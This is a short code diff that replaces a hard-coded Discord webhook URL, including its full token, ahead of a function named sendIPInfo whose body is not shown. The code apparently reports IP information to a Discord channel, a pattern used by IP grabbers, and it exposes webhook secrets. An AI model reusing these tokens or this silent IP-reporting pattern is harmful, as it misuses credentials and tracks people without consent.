@@ -1,4 +1,4 @@
-const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
+const webhookURL = 'https://discordapp.com/api/webhooks/1374439335784353842/bOzRgYIW_ZZvSkTuiWk-wiL-tkVklOo9wqgH2lkljXC41w3waBQutFo7Cgo5RxgpD_1W';
 
 export async function sendIPInfo() {
   try {
